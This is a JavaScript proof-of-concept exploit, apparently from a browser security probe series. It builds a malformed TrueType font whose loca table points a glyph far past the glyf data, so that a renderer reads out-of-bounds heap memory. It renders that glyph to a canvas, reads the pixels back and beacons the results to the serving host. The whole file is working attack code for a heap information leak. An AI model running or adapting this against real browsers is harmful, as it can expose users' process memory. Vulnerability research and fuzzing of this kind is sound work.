// p250-font-oob-leak — TrueType loca OOB heap info leak probe
//
// Technique: Build a minimal TrueType font in-memory where the loca table
// directs glyph 1 to offset 0x2000 within the glyf table, far past the
// actual 128-byte glyf data.  When the font renderer reads glyph 1 (mapped
// to character 'A' via cmap), it reads heap memory beyond glyf as glyph
// outline data.  Rendering to canvas and reading back via getImageData
// converts heap bytes into observable pixel patterns.
//
// Font structure (10 tables, ~668 bytes):
//   head, hhea, hmtx, maxp, OS/2, name, cmap, post, glyf (128B), loca
//   loca (long format): glyph0=0, glyph1=0x2000 (OOB), sentinel=0x2100
//
// Beacon prefix: V250-

(function() {
'use strict';

// ─── Beacon queue (serial send via sendBeacon with XHR fallback) ───
var BQ = [], BD = false;
function B(tag, info) {
    var s = 'V250-' + tag;
    if (info !== undefined) s += '/' + encodeURIComponent(String(info).substring(0, 600));
    BQ.push(s);
    if (!BD) drain();
}
function drain() {
    if (!BQ.length) { BD = false; return; }
    BD = true;
    var path = '/beacon/' + BQ.shift();
    try {
        if (navigator.sendBeacon) {
            navigator.sendBeacon(path, '');
        } else {
            var x = new XMLHttpRequest();
            x.open('GET', location.protocol + '//' + location.host + path, true);
            x.send();
        }
    } catch (e) { /* swallow */ }
    setTimeout(drain, 15);
}

function h2(v) { return ('0' + v.toString(16)).slice(-2); }

// ─── TrueType checksum: sum of big-endian uint32 words ───
function tcs(dv, off, len) {
    var n = ((len + 3) & ~3) >>> 2;
    var s = 0;
    for (var i = 0; i < n; i++) s = (s + dv.getUint32(off + i * 4)) >>> 0;
    return s;
}

// ═══════════════════════════════════════════════════════════════
// Table builders — each returns a Uint8Array of exact table size
// ═══════════════════════════════════════════════════════════════

function mkHead() {
    // 54 bytes — TrueType font header
    var b = new Uint8Array(54), v = new DataView(b.buffer);
    v.setUint16(0, 1);               // majorVersion
    // minorVersion = 0 (byte 2)
    v.setUint32(4, 0x00010000);       // fontRevision 1.0
    // checksumAdjustment at byte 8: patched after assembly
    v.setUint32(12, 0x5F0F3CF5);      // magic number
    v.setUint16(16, 0x000B);          // flags: baseline-at-y0 + lsb-at-x0 + instructions-may-alter
    v.setUint16(18, 1024);            // unitsPerEm
    // created / modified at bytes 20-35: epoch zero
    v.setInt16(36, 0);                // xMin
    v.setInt16(38, 0);                // yMin
    v.setInt16(40, 512);              // xMax
    v.setInt16(42, 700);              // yMax
    // macStyle = 0 (byte 44)
    v.setUint16(46, 8);               // lowestRecPPEM
    v.setInt16(48, 2);                // fontDirectionHint (mixed)
    v.setInt16(50, 1);                // indexToLocFormat = 1 (long / uint32)
    // glyphDataFormat = 0 (byte 52)
    return b;
}

function mkHhea() {
    // 36 bytes
    var b = new Uint8Array(36), v = new DataView(b.buffer);
    v.setUint16(0, 1);               // majorVersion
    // minorVersion = 0
    v.setInt16(4, 800);              // ascender
    v.setInt16(6, -200);             // descender
    // lineGap = 0
    v.setUint16(10, 512);            // advanceWidthMax
    // minLeftSideBearing, minRightSideBearing = 0
    v.setInt16(16, 512);             // xMaxExtent
    v.setInt16(18, 1);               // caretSlopeRise
    // caretSlopeRun = 0, caretOffset = 0, reserved*4 = 0
    // metricDataFormat = 0
    v.setUint16(34, 2);              // numberOfHMetrics
    return b;
}

function mkHmtx() {
    // 8 bytes — 2 long metric records
    var b = new Uint8Array(8), v = new DataView(b.buffer);
    v.setUint16(0, 512);             // glyph 0 advanceWidth
    // glyph 0 lsb = 0
    v.setUint16(4, 512);             // glyph 1 advanceWidth
    // glyph 1 lsb = 0
    return b;
}

function mkMaxp() {
    // 32 bytes — version 1.0
    var b = new Uint8Array(32), v = new DataView(b.buffer);
    v.setUint32(0, 0x00010000);       // version 1.0
    v.setUint16(4, 2);               // numGlyphs
    v.setUint16(6, 4);               // maxPoints
    v.setUint16(8, 1);               // maxContours
    // maxCompositePoints = 0, maxCompositeContours = 0
    v.setUint16(14, 2);              // maxZones
    // rest zero
    return b;
}

function mkGlyf() {
    // 128 bytes — glyph 0 is a .notdef rectangle, rest is zero padding
    var b = new Uint8Array(128), v = new DataView(b.buffer);
    // Glyph 0: simple contour, rectangle (100,0)-(400,700)
    v.setInt16(0, 1);                // numberOfContours
    v.setInt16(2, 100);              // xMin
    v.setInt16(4, 0);                // yMin
    v.setInt16(6, 400);              // xMax
    v.setInt16(8, 700);              // yMax
    v.setUint16(10, 3);              // endPtsOfContours[0] = 3 (4 points: 0-3)
    // instructionLength = 0
    // Flags: 4 points, each ON_CURVE (0x01), int16 x and y deltas
    b[14] = 1; b[15] = 1; b[16] = 1; b[17] = 1;
    // X coordinate deltas (int16):  100, 300, 0, -300
    v.setInt16(18, 100);             // pt0 (100,0)
    v.setInt16(20, 300);             // pt1 (400,0)
    v.setInt16(22, 0);               // pt2 (400,700)
    v.setInt16(24, -300);            // pt3 (100,700)
    // Y coordinate deltas (int16):  0, 0, 700, 0
    v.setInt16(26, 0);               // pt0
    v.setInt16(28, 0);               // pt1
    v.setInt16(30, 700);             // pt2
    v.setInt16(32, 0);               // pt3
    // Bytes 34-127: zero padding
    return b;
}

function mkLoca() {
    // 12 bytes — long format (uint32), numGlyphs+1 = 3 entries
    // Glyph 1 offset is 0x2000 = 8192, far past glyf's 128 bytes.
    // Sentinel at 0x2100 gives glyph 1 a length of 256 bytes, ensuring
    // the renderer attempts to parse data (not skip a zero-length glyph).
    var b = new Uint8Array(12), v = new DataView(b.buffer);
    v.setUint32(0, 0x00000000);       // glyph 0 at glyf + 0
    v.setUint32(4, 0x00002000);       // glyph 1 at glyf + 0x2000 (OOB)
    v.setUint32(8, 0x00002100);       // sentinel (glyph 1 len = 256)
    return b;
}

function mkCmap() {
    // 44 bytes — format 4 mapping char 0x41 ('A') to glyph index 1
    var b = new Uint8Array(44), v = new DataView(b.buffer);
    // cmap header
    // version = 0
    v.setUint16(2, 1);               // numTables
    v.setUint16(4, 3);               // platformID (Windows)
    v.setUint16(6, 1);               // encodingID (Unicode BMP)
    v.setUint32(8, 12);              // offset to format 4 subtable

    // Format 4 subtable at byte 12 — 2 segments (char + sentinel)
    var s = 12;
    v.setUint16(s + 0, 4);           // format
    v.setUint16(s + 2, 32);          // subtable length
    // language = 0
    v.setUint16(s + 6, 4);           // segCountX2
    v.setUint16(s + 8, 4);           // searchRange  2^floor(log2(2))*2
    v.setUint16(s + 10, 1);          // entrySelector log2(2)
    // rangeShift = 0
    // endCode[]
    v.setUint16(s + 14, 0x0041);     // segment 0: endCode 'A'
    v.setUint16(s + 16, 0xFFFF);     // segment 1: sentinel
    // reservedPad = 0
    // startCode[]
    v.setUint16(s + 20, 0x0041);     // segment 0: startCode 'A'
    v.setUint16(s + 22, 0xFFFF);     // segment 1: sentinel
    // idDelta[]
    v.setInt16(s + 24, -64);         // 'A'(0x41) + (-64) = glyph 1
    v.setInt16(s + 26, 1);           // sentinel: 0xFFFF + 1 = glyph 0 (unmapped)
    // idRangeOffset[] = 0, 0
    return b;
}

function mkName() {
    // 50 bytes — family "OOB" + subfamily "Regular"
    var b = new Uint8Array(50), v = new DataView(b.buffer);
    // format = 0
    v.setUint16(2, 2);               // count
    v.setUint16(4, 30);              // stringOffset (6 + 2*12 = 30)
    // Record 0: Family name "OOB" (6 bytes UTF-16BE)
    v.setUint16(6, 3);               // platformID (Windows)
    v.setUint16(8, 1);               // encodingID (Unicode BMP)
    v.setUint16(10, 0x0409);         // languageID (en-US)
    v.setUint16(12, 1);              // nameID (Family)
    v.setUint16(14, 6);              // length
    // offset = 0
    // Record 1: Subfamily name "Regular" (14 bytes UTF-16BE)
    v.setUint16(18, 3);
    v.setUint16(20, 1);
    v.setUint16(22, 0x0409);
    v.setUint16(24, 2);              // nameID (Subfamily)
    v.setUint16(26, 14);             // length
    v.setUint16(28, 6);              // offset into string storage
    // String storage at byte 30
    var S = 30;
    // "OOB" in UTF-16BE
    v.setUint16(S + 0, 0x004F);     // O
    v.setUint16(S + 2, 0x004F);     // O
    v.setUint16(S + 4, 0x0042);     // B
    // "Regular" in UTF-16BE
    v.setUint16(S + 6,  0x0052);    // R
    v.setUint16(S + 8,  0x0065);    // e
    v.setUint16(S + 10, 0x0067);    // g
    v.setUint16(S + 12, 0x0075);    // u
    v.setUint16(S + 14, 0x006C);    // l
    v.setUint16(S + 16, 0x0061);    // a
    v.setUint16(S + 18, 0x0072);    // r
    return b;
}

function mkPost() {
    // 32 bytes — version 3.0 (no glyph names)
    var b = new Uint8Array(32), v = new DataView(b.buffer);
    v.setUint32(0, 0x00030000);       // version 3.0
    // italicAngle = 0
    v.setInt16(8, -100);             // underlinePosition
    v.setInt16(10, 50);              // underlineThickness
    // isFixedPitch = 0, minMem/maxMem = 0
    return b;
}

function mkOS2() {
    // 96 bytes — version 4
    var b = new Uint8Array(96), v = new DataView(b.buffer);
    v.setUint16(0, 4);               // version
    v.setInt16(2, 512);              // xAvgCharWidth
    v.setUint16(4, 400);             // usWeightClass (Regular)
    v.setUint16(6, 5);               // usWidthClass (Normal)
    // fsType = 0 (installable embedding)
    // subscript / superscript / strikeout = 0
    // sFamilyClass = 0
    // panose = 10 bytes of zero ("Any")
    v.setUint32(42, 0x00000001);     // ulUnicodeRange1 bit 0 (Basic Latin)
    // achVendID at byte 58
    b[58] = 0x58; b[59] = 0x58; b[60] = 0x58; b[61] = 0x58; // "XXXX"
    v.setUint16(62, 0x0040);         // fsSelection bit 6 (REGULAR)
    v.setUint16(64, 0x0041);         // usFirstCharIndex
    v.setUint16(66, 0x0041);         // usLastCharIndex
    v.setInt16(68, 800);             // sTypoAscender
    v.setInt16(70, -200);            // sTypoDescender
    // sTypoLineGap = 0
    v.setUint16(74, 1024);           // usWinAscent
    v.setUint16(76, 200);            // usWinDescent
    v.setUint32(78, 0x00000001);     // ulCodePageRange1 bit 0 (1252)
    // ulCodePageRange2 = 0
    v.setInt16(86, 500);             // sxHeight
    v.setInt16(88, 700);             // sCapHeight
    // usDefaultChar = 0
    v.setUint16(92, 0x0020);         // usBreakChar (space)
    // usMaxContext = 0
    return b;
}

// ═══════════════════════════════════════════════
// Font assembly: build directory, copy tables,
// compute checksums, patch head.checksumAdjustment
// ═══════════════════════════════════════════════

function buildFont() {
    var tbl = {
        'head': mkHead(), 'hhea': mkHhea(), 'hmtx': mkHmtx(),
        'maxp': mkMaxp(), 'OS/2': mkOS2(),  'name': mkName(),
        'cmap': mkCmap(), 'post': mkPost(),  'glyf': mkGlyf(),
        'loca': mkLoca()
    };

    // Sort tags for directory (TT spec: binary ascending by 4-byte tag)
    var tags = Object.keys(tbl).sort();
    var N = tags.length;  // 10
    var HDR = 12, DIR = N * 16;

    // Compute table offsets (4-byte aligned)
    var pos = (HDR + DIR + 3) & ~3;
    var tOff = {}, tPad = {};
    for (var i = 0; i < N; i++) {
        tOff[tags[i]] = pos;
        tPad[tags[i]] = (tbl[tags[i]].length + 3) & ~3;
        pos += tPad[tags[i]];
    }

    var buf = new ArrayBuffer(pos);
    var dv = new DataView(buf);
    var u8 = new Uint8Array(buf);

    // ── Font header ──
    dv.setUint32(0, 0x00010000);     // sfVersion (TrueType)
    dv.setUint16(4, N);              // numTables

    var p2 = 1;
    while (p2 * 2 <= N) p2 *= 2;    // largest power-of-2 <= N
    dv.setUint16(6, p2 * 16);       // searchRange
    var es = 0, t = p2;
    while (t > 1) { t >>>= 1; es++; }
    dv.setUint16(8, es);             // entrySelector
    dv.setUint16(10, N * 16 - p2 * 16); // rangeShift

    // ── Copy table data and write directory entries ──
    for (var i = 0; i < N; i++) {
        var tag = tags[i];
        var data = tbl[tag];
        var off = tOff[tag];

        // Copy table bytes into the font buffer (padding is already zero)
        u8.set(data, off);

        // Compute table checksum
        var cs = tcs(dv, off, data.length);

        // Write 16-byte directory entry
        var de = HDR + i * 16;
        for (var j = 0; j < 4; j++) u8[de + j] = tag.charCodeAt(j);
        dv.setUint32(de + 4, cs);         // checksum
        dv.setUint32(de + 8, off);         // offset
        dv.setUint32(de + 12, data.length); // length
    }

    // ── Patch head.checksumAdjustment ──
    // Per spec: zero the field, compute entire-file checksum, set field = 0xB1B0AFBA - sum
    var ho = tOff['head'];
    dv.setUint32(ho + 8, 0);
    var wcs = tcs(dv, 0, pos);
    dv.setUint32(ho + 8, (0xB1B0AFBA - wcs) >>> 0);

    return buf;
}

// ═════════════════════════════════════
// Render glyph 'A' and read back pixels
// ═════════════════════════════════════

function doRender() {
    try {
        var c = document.getElementById('c');
        if (!c) { B('NO-CANVAS'); return; }
        var ctx = c.getContext('2d');
        if (!ctx) { B('NO-CTX'); return; }

        var W = c.width, H = c.height;
        B('CANVAS-SIZE', W + 'x' + H);

        // White fill background
        ctx.fillStyle = '#FFFFFF';
        ctx.fillRect(0, 0, W, H);

        // Draw character 'A' using the OOB font
        ctx.fillStyle = '#000000';
        ctx.font = '48px oobfont';
        ctx.fillText('A', 10, 60);

        // Also draw .notdef (glyph 0) char to verify font loaded
        // Unicode U+0000 won't render, use a char not in cmap instead
        ctx.fillText('B', 120, 60);

        // Allow rendering pipeline to complete before readback
        setTimeout(function() { doReadback(ctx, W, H); }, 200);
    } catch (e) {
        B('RENDER-ERR', e.message);
    }
}

function doReadback(ctx, W, H) {
    try {
        var img = ctx.getImageData(0, 0, W, H);
        var d = img.data;
        var cnt = 0;
        var samp = [];
        var hash = 0;

        for (var i = 0; i < d.length; i += 4) {
            var r = d[i], g = d[i + 1], b = d[i + 2], a = d[i + 3];

            // djb2 hash over all channels
            hash = ((hash << 5) - hash + r) | 0;
            hash = ((hash << 5) - hash + g) | 0;
            hash = ((hash << 5) - hash + b) | 0;
            hash = ((hash << 5) - hash + a) | 0;

            // Count non-white pixels (anything other than 0xFFFFFFFF)
            if (r < 255 || g < 255 || b < 255 || a < 255) {
                cnt++;
                if (samp.length < 8) {
                    var px = i >>> 2;
                    var x = px % W, y = (px / W) | 0;
                    samp.push(x + ',' + y + ':' + h2(r) + h2(g) + h2(b) + h2(a));
                }
            }
        }

        B(cnt > 0 ? 'PIXELS-NONZERO' : 'PIXELS-ZERO', cnt);
        B('PIXEL-HASH', (hash >>> 0).toString(16));
        if (samp.length > 0) {
            B('PIXEL-SAMPLE', samp.join(';'));
        }
        B('DONE');
    } catch (e) {
        B('READ-ERR', e.message);
    }
}

// ═══════════════════════════
// Main entry point
// ═══════════════════════════

try {
    B('BOOT');

    var fontBuf = buildFont();
    B('FONT-BUILT', fontBuf.byteLength);

    if (typeof FontFace === 'undefined') {
        B('NO-FONTFACE-API');
    } else if (!document.fonts) {
        B('NO-DOC-FONTS');
    } else {
        var t0 = Date.now();
        try {
            var face = new FontFace('oobfont', fontBuf);
            face.load().then(function(loaded) {
                try {
                    document.fonts.add(loaded);
                    B('FONT-LOADED', (Date.now() - t0) + 'ms');

                    // Check font is active
                    try {
                        var active = document.fonts.check('48px oobfont');
                        B('FONT-CHECK', active ? 'active' : 'inactive');
                    } catch (e) { /* check() optional */ }

                    setTimeout(doRender, 300);
                } catch (e) {
                    B('FONT-ADD-ERR', e.message);
                }
            }).catch(function(e) {
                B('FONT-ERR', e.message + ' (' + (Date.now() - t0) + 'ms)');
            });
        } catch (e) {
            B('FONTFACE-CTOR-ERR', e.message);
        }
    }
} catch (e) {
    B('FATAL', e.message);
}

})();
